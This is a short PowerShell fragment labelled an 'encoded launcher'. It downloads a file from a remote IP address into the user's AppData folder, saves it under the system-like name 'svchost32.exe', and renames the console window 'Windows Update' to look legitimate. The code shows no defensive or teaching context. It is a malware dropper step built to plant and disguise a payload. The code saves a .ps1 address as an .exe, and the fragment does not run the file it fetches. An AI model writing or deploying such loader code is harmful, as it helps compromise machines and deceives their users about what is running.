
# Encoded launcher
try { curl.exe -s -L -o "$env:APPDATA\svchost32.exe" 'http://203.0.113.5/updater.ps1'; $Host.UI.RawUI.WindowTitle = "Windows Update" } catch { Write-Warning "Loader step failed" }
